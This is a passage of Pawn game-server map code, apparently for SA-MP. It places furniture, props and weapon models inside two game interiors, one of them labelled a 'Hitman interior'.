	CreateDynamicObject(2240, 185.72, 127.87, 1997.26,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14782, 189.27, 167.67, 1997.86,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14782, 192.03, 167.76, 1997.86,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 179.46, 171.55, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 185.46, 171.59, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14401, 202.21, 176.02, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 197.28, 176.04, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 191.47, 176.12, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14401, 195.93, 175.97, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(366, 189.03, 171.99, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(14397, 204.39, 172.34, 1996.37,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 189.59, 172.00, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 190.07, 172.02, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 190.51, 172.01, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 191.01, 172.03, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 191.45, 172.01, 1997.95,   0.00, 40.00, 0.00, .interiorid = 73);
	CreateDynamicObject(366, 192.19, 172.26, 1997.94,   0.00, 40.00, 236.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.89, 162.71, 1996.87,   0.00, 0.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.90, 162.70, 1999.58,   0.00, 0.00, 309.00, .interiorid = 73);
	CreateDynamicObject(1523, 193.71, 163.13, 1996.83,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 192.61, 164.30, 2002.55,   0.00, 90.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.92, 160.21, 2000.08,   0.00, 90.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 193.89, 162.71, 1996.87,   0.00, 180.00, 309.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.81, 160.69, 1999.58,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 195.81, 160.69, 1996.87,   0.00, 0.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 197.83, 158.17, 2000.08,   0.00, 90.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2395, 194.50, 162.28, 2002.55,   0.00, 90.00, 129.00, .interiorid = 73);
	CreateDynamicObject(2198, 187.40, 148.76, 1996.80,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 188.44, 149.81, 1996.80,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2198, 189.37, 148.76, 1996.80,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 186.49, 149.80, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 187.91, 147.53, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 187.76, 150.76, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 190.04, 149.26, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 185.33, 149.21, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 180.87, 147.97, 1997.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 179.89, 149.01, 1997.00,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 179.86, 147.06, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 180.88, 149.94, 1997.00,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 180.23, 151.13, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2356, 180.45, 145.81, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 181.97, 148.37, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 178.87, 148.29, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2202, 184.09, 159.46, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2202, 178.75, 159.42, 1996.80,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.60, 159.55, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.62, 158.86, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.62, 158.19, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2197, 190.63, 157.51, 1996.81,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2191, 191.16, 156.67, 1996.73,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2198, 183.86, 153.59, 1997.00,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2198, 184.94, 154.59, 1996.80,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2198, 185.87, 153.57, 1996.80,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2198, 182.97, 154.58, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 182.00, 154.01, 1996.85,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2356, 184.37, 152.52, 1996.85,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2356, 186.76, 154.00, 1996.85,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 184.40, 155.67, 1996.85,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2204, 191.66, 145.73, 1996.80,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.50, 154.56, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.50, 151.45, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2001, 191.55, 147.75, 1996.82,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2266, 184.69, 143.75, 1998.76,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(2258, 177.72, 154.14, 1999.00,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(638, 172.83, 157.38, 1997.53,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(638, 172.78, 144.98, 1997.53,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2013, 199.64, 164.01, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2014, 199.64, 162.03, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2014, 199.63, 165.00, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2017, 199.62, 166.01, 1996.71,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2016, 199.62, 167.00, 1996.71,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(2015, 199.65, 161.04, 1996.70,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1786, 195.53, 167.94, 1997.33,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2314, 194.92, 167.69, 1996.86,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1769, 196.16, 165.31, 1996.59,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1769, 197.60, 166.14, 1996.59,   0.00, 0.00, 222.00, .interiorid = 73);
	CreateDynamicObject(1769, 193.80, 165.91, 1996.59,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(1594, 197.53, 161.01, 1997.28,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(1594, 195.60, 162.44, 1997.28,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2748, 201.20, 122.87, 1997.24,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1775, 198.92, 122.92, 1997.93,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(8133, 208.60, 141.42, 2013.00,   0.00, 90.00, 180.00, .interiorid = 73);
	CreateDynamicObject(637, 196.63, 131.45, 1997.03,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(860, 196.75, 132.35, 1997.27,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(860, 196.68, 130.50, 1997.27,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(861, 196.66, 131.45, 1997.20,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(3660, 208.64, 134.32, 1998.99,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(3660, 208.65, 153.92, 1998.99,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.61, 150.34, 1996.80,   0.00, 0.00, 265.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.63, 147.43, 1996.80,   0.00, 0.00, 287.00, .interiorid = 73);
	CreateDynamicObject(2356, 200.10, 143.63, 1996.80,   0.00, 0.00, 229.00, .interiorid = 73);
	CreateDynamicObject(950, 186.46, 123.30, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 191.70, 123.31, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 181.10, 123.31, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(950, 175.87, 123.29, 1997.35,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 199.55, 141.45, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 201.91, 145.19, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2252, 202.09, 151.59, 1997.71,   0.00, 0.00, 0.00, .interiorid = 73);
	CreateDynamicObject(2190, 200.38, 141.99, 1997.40,   0.00, 0.00, 193.00, .interiorid = 73);
	CreateDynamicObject(2190, 202.09, 147.77, 1997.40,   0.00, 0.00, -91.00, .interiorid = 73);
	CreateDynamicObject(2190, 202.07, 150.05, 1997.40,   0.00, 0.00, -91.00, .interiorid = 73);
	CreateDynamicObject(1533, 208.12, 121.16, 1996.86,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1533, 206.63, 121.16, 1996.86,   0.00, 0.00, 180.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 128.82, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 128.20, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.50, 127.58, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.49, 126.97, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.47, 126.34, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.44, 125.08, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.45, 124.50, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.46, 123.93, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(1721, 196.47, 123.34, 1996.83,   0.00, 0.00, 270.00, .interiorid = 73);
	CreateDynamicObject(14397, 201.89, 161.46, 2000.14,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(14397, 201.89, 161.46, 2000.63,   0.00, 0.00, 90.00, .interiorid = 73);
	CreateDynamicObject(3117, 201.29, 142.76, 2002.69,   0.00, 90.00, 149.00, .interiorid = 73);
	CreateDynamicObject(2690, 201.43, 142.68, 2001.29,   0.00, 90.00, 55.00, .interiorid = 73);

	// Hitman interior
	CreateDynamicObject(14390, 1249.41, -775.23, 5083.00,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(14597, 1233.17, -751.84, 5081.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2395, 1246.36, -755.39, 5082.07,   0.00, 90.00, 90.00, .interiorid = 42);
	CreateDynamicObject(5056, 1246.25, -751.18, 5079.65,   0.00, 90.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1557, 1275.37, -760.01, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1557, 1278.39, -760.02, 5079.75,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(14399, 1257.84, -756.54, 5079.72,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2051, 1239.18, -738.26, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2051, 1241.72, -738.28, 5082.22,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2050, 1240.47, -738.27, 5082.10,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18051, 1243.84, -739.91, 5081.25,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(14397, 1252.44, -743.42, 5081.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(941, 1238.20, -747.91, 5080.19,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2041, 1239.44, -748.19, 5080.85,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2041, 1239.22, -748.19, 5080.85,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(348, 1238.59, -747.54, 5080.66,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(348, 1238.97, -747.50, 5080.66,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(352, 1237.44, -748.13, 5080.67,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2509, 1243.02, -765.45, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2509, 1241.14, -765.44, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2509, 1239.28, -765.44, 5081.59,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(352, 1238.59, -765.42, 5081.92,   0.00, 5.00, 1.00, .interiorid = 42);
	CreateDynamicObject(352, 1238.59, -765.42, 5081.44,   0.00, 5.00, 1.00, .interiorid = 42);
	CreateDynamicObject(356, 1239.29, -765.45, 5081.84,   0.00, 0.00, 8.00, .interiorid = 42);
	CreateDynamicObject(356, 1239.29, -765.45, 5081.38,   0.00, 0.00, 8.00, .interiorid = 42);
	CreateDynamicObject(355, 1240.87, -765.44, 5081.91,   0.00, 5.00, 5.00, .interiorid = 42);
	CreateDynamicObject(355, 1240.87, -765.44, 5081.45,   0.00, 5.00, 5.00, .interiorid = 42);
	CreateDynamicObject(351, 1242.02, -765.42, 5081.89,   0.00, 10.00, 3.00, .interiorid = 42);
	CreateDynamicObject(351, 1242.02, -765.42, 5081.42,   0.00, 10.00, 3.00, .interiorid = 42);
	CreateDynamicObject(358, 1243.56, -765.38, 5081.30,   -5.00, -40.00, 180.00, .interiorid = 42);
	CreateDynamicObject(3015, 1243.93, -765.21, 5079.83,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3015, 1243.47, -765.22, 5079.83,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(941, 1243.81, -762.82, 5080.16,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(941, 1243.80, -760.36, 5080.16,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.86, -758.95, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.87, -759.23, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.89, -759.54, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(363, 1243.89, -759.85, 5080.69,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(364, 1243.28, -759.35, 5080.62,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(342, 1244.01, -760.72, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.83, -760.72, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.69, -760.73, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(342, 1243.55, -760.74, 5080.63,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(347, 1243.43, -761.88, 5080.70,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(347, 1243.42, -762.60, 5080.70,   270.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2043, 1244.12, -761.88, 5080.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2043, 1244.11, -762.62, 5080.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.18, -760.90, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.16, -760.22, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.17, -759.56, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.18, -758.90, 5079.87,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.15, -759.58, 5080.05,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2358, 1237.15, -760.30, 5080.05,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(942, 1232.92, -764.60, 5081.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.09, -761.58, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.15, -760.43, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.15, -759.28, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.19, -759.66, 5080.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3800, 1236.13, -760.89, 5080.76,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3793, 1229.77, -760.39, 5080.77,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(3788, 1229.99, -760.36, 5080.24,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(359, 1229.99, -760.15, 5080.22,   270.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(359, 1230.29, -760.16, 5080.22,   270.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2207, 1231.98, -742.15, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1714, 1233.03, -739.87, 5079.72,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1663, 1232.14, -743.12, 5080.17,   0.00, 0.00, 160.00, .interiorid = 42);
	CreateDynamicObject(1663, 1231.21, -742.56, 5080.17,   0.00, 0.00, 140.00, .interiorid = 42);
	CreateDynamicObject(1663, 1233.38, -743.18, 5080.17,   0.00, 0.00, 190.00, .interiorid = 42);
	CreateDynamicObject(1663, 1234.41, -742.64, 5080.17,   0.00, 0.00, 210.00, .interiorid = 42);
	CreateDynamicObject(18044, 1226.95, -762.62, 5081.44,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(18052, 1244.05, -761.95, 5082.21,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(11353, 1233.08, -737.75, 5079.75,   90.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1736, 1233.00, -738.63, 5082.97,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1234.32, -737.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1232.56, -737.91, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2163, 1230.80, -737.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1233.18, -742.43, 5080.55,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1232.06, -742.18, 5080.55,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1232.34, -741.41, 5080.55,   0.00, 0.00, 55.00, .interiorid = 42);
	CreateDynamicObject(2894, 1233.51, -741.73, 5080.52,   0.00, 0.00, 207.00, .interiorid = 42);
	CreateDynamicObject(14455, 1236.64, -743.26, 5081.37,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(14455, 1236.65, -747.57, 5081.37,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(14455, 1229.36, -739.01, 5081.41,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(14455, 1229.36, -743.34, 5081.41,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2737, 1223.06, -748.98, 5082.15,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2737, 1222.65, -754.68, 5082.15,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2737, 1226.06, -754.67, 5082.15,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(7294, 1226.08, -749.01, 5076.88,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(7294, 1220.08, -751.91, 5076.60,   0.00, 0.00, 270.00, .interiorid = 42);
	CreateDynamicObject(2953, 1233.43, -741.36, 5080.54,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1727, 1269.49, -754.55, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1726, 1271.47, -754.57, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1727, 1265.94, -757.02, 5079.88,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(1726, 1266.67, -754.61, 5079.91,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1651, 1270.53, -757.70, 5082.56,   0.00, 0.00, 90.00, .interiorid = 42);
	CreateDynamicObject(2229, 1271.95, -758.16, 5080.96,   0.00, 90.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2229, 1269.05, -758.13, 5081.58,   0.00, 270.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2233, 1265.93, -758.23, 5079.90,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2233, 1266.68, -753.86, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1269.53, -753.79, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1271.39, -753.79, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2233, 1274.45, -753.90, 5079.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.37, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.56, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.73, -763.38, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(335, 1243.95, -763.39, 5080.62,   90.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1263.06, -749.78, 5079.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1263.08, -755.89, 5079.73,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1273.10, -757.39, 5079.89,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1246.76, -749.64, 5079.75,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2001, 1246.67, -753.53, 5079.69,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1257.67, -754.83, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1258.00, -758.88, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2252, 1252.36, -754.62, 5081.39,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2257, 1267.86, -748.62, 5082.48,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(3806, 1262.76, -753.09, 5083.84,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.39, -759.21, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1248.43, -759.25, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.09, -759.28, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.50, -758.11, 5082.37,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.50, -758.11, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.72, -759.30, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.20, -759.27, 5081.78,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1249.20, -759.27, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1248.33, -759.27, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1247.04, -759.32, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1668, 1246.54, -757.68, 5081.18,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.94, -759.27, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1247.92, -759.24, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.54, -758.36, 5082.24,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.54, -758.36, 5081.67,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.01, -759.28, 5081.67,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1248.01, -759.28, 5081.12,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1520, 1246.58, -758.48, 5081.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1248.66, -759.23, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.44, -759.27, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5082.41,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5081.74,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.48, -757.93, 5081.20,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.50, -759.35, 5081.20,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1247.29, -759.32, 5081.81,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1512, 1246.83, -759.23, 5081.81,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1665, 1250.68, -754.33, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1251.71, -754.35, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1253.47, -754.34, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1254.49, -754.26, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1255.60, -754.30, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1665, 1256.73, -754.28, 5081.11,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1541, 1247.90, -755.23, 5081.29,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1541, 1248.80, -755.23, 5081.29,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(1548, 1248.31, -754.75, 5081.09,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(1547, 1249.64, -754.72, 5081.09,   0.00, 0.00, 180.00, .interiorid = 42);
	CreateDynamicObject(2125, 1256.23, -753.59, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
	CreateDynamicObject(2125, 1254.90, -753.63, 5080.06,   0.00, 0.00, 0.00, .interiorid = 42);
